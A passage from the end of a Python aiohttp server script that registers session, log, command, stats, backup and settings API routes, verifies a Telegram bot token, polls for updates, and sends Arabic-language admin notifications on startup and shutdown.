    app.router.add_get("/api/sessions", handle_api_sessions)
    app.router.add_post("/api/sessions", handle_api_create_session)
    app.router.add_delete("/api/sessions/{session_id}", handle_api_delete_session)

    # Logs & Commands
    app.router.add_get("/api/logs", handle_api_logs)
    app.router.add_post("/api/logs/clear", handle_api_clear_logs)
    app.router.add_get("/api/commands", handle_api_commands)

    # Stats, Export, Backup, Settings
    app.router.add_get("/api/stats", handle_api_stats)
    app.router.add_post("/api/export", handle_api_export)
    app.router.add_post("/api/backup", handle_api_backup)
    app.router.add_get("/api/settings", handle_api_settings_get)
    app.router.add_post("/api/settings", handle_api_settings_update)

    return app


# ═══════════════════════════════════════════════════════════════════════════════
# Startup & Shutdown
# ═══════════════════════════════════════════════════════════════════════════════

async def on_startup(app: web.Application):
    global polling_active
    ensure_data_dir()
    append_event("بدء تشغيل الخادم", {"port": SERVER_PORT})

    # Verify bot token
    me = await tg_request("getMe", {})
    if me and me.get("ok"):
        bot_info = me["result"]
        log.info("Bot: @%s (%s)", bot_info.get("username"), bot_info.get("first_name"))
        append_event("التحقق من البوت", {"username": bot_info.get("username")})

        # Start getUpdates polling as background task
        app["poll_task"] = asyncio.create_task(poll_updates())
        log.info("Started getUpdates polling")

        # Send startup notification
        await send_admin(
            f"🟢 <b>الخادم يعمل</b>\n\n"
            f"⚡ المنفذ: <code>{SERVER_PORT}</code>\n"
            f"🕐 الوقت: <code>{ts()}</code>\n"
            f"📱 الأجهزة: <code>{len(get_devices())}</code>\n"
            f"📡 الوضع: <code>getUpdates Polling</code>\n\n"
            f"استخدم /start للبدء"
        )
    else:
        log.error("Failed to verify bot token!")


async def on_cleanup(app: web.Application):
    global polling_active, _tg_session
    polling_active = False
    append_event("إيقاف الخادم", {})
    log.info("Server shutting down...")

    # Cancel polling task
    poll_task = app.get("poll_task")
    if poll_task:
        poll_task.cancel()
        try:
            await poll_task
        except asyncio.CancelledError:
            pass

    # Close TG session
    if _tg_session and not _tg_session.closed:
        await _tg_session.close()


# ═══════════════════════════════════════════════════════════════════════════════
# Main Entry Point
# ═══════════════════════════════════════════════════════════════════════════════

async def _run():
    app = create_app()
    app.on_startup.append(on_startup)
    app.on_cleanup.append(on_cleanup)

    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, "0.0.0.0", SERVER_PORT)
    await site.start()
    log.info("Server running on http://0.0.0.0:%d", SERVER_PORT)
    append_event("الخادم جاهز", {"port": SERVER_PORT})

    try:
        await asyncio.Event().wait()
    except (asyncio.CancelledError, KeyboardInterrupt):
        pass
    finally:
        await runner.cleanup()


def main():
    try:
        asyncio.run(_run())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
